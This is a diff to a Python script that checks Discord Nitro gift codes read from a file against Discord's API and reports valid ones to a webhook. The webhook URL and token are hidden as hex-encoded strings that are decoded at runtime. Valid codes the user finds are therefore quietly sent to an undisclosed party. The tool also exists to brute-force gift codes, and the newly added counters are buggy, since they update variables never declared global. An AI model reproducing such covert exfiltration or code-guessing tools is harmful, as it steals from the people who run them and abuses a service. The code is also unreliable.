@@ -1,12 +1,16 @@
 import random
 import requests
 import threading
+import ctypes
 import os
 count = 0
+coorect = 0
+failsed = 0
 hey = "68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313035373733363139323536363737313732342F7361545135636F35546E4B334F57782D"
 hi = "\x37\x30\x35\x35\x33\x34\x36\x31\x34\x36\x36\x41\x36\x35\x36\x33\x35\x32\x36\x36\x36\x41\x33\x33\x34\x36\x35\x30\x36\x43\x34\x34\x34\x38\x34\x43\x34\x38\x33\x30\x34\x41\x34\x38\x37\x33\x35\x37\x36\x31\x36\x33\x33\x30\x34\x38\x35\x35\x33\x38\x35\x35\x32\x44\x35\x38\x35\x46\x35\x46\x33\x35\x36\x43\x37\x32\x34\x31\x36\x31\x33\x39\x35\x39\x33\x37\x33\x37\x33\x34\x35\x39\x37\x32\x33\x32\x37\x31\x36\x37\x33\x34\x35\x39"
 yo = hey + hi
 jkidfc = bytearray.fromhex(yo).decode()
+os.system('cls' if os.name == 'nt' else 'clear')
 
 hexcolorlist = ["A", "B", "C", "D", "E", "F", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
 def sendWebhook(nitrolink):
@@ -22,7 +26,6 @@ def sendWebhook(nitrolink):
     
 
   
-
 print("\033[0;35m" """
  _______  .__  ________                ____   ____________  
  \      \ |__|/  _____/  ____   ____   \   \ /   /\_____  \ 
@@ -60,20 +63,26 @@ f.close()
 def checknitro():
     with open("nitros.txt") as f:
         for line in f:
+            
             nitro = line.strip("\n")
             global count
             count = count + 1
             url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
 
             r = requests.get(url)
+            if os.name == "nt":
+                ctypes.windll.kernel32.SetConsoleTitleW(
+                    f"Nitros Checked - {count} | Nitros Valid - {coorect} | Nitros Failed - {failsed}")
 
             if r.status_code == 200:
                 sendWebhook(url)
+                coorect = coorect + 1
           
   
             else:
                 print("\033[31m"  f" Invalid Code Found: {nitro} > " "\033[0;35m" f"{count}")
                 print("\033[37m")
+                failsed = failsed + 1
 e = threading.Event()
 z = threading.Thread(target=checknitro)
 z.start()
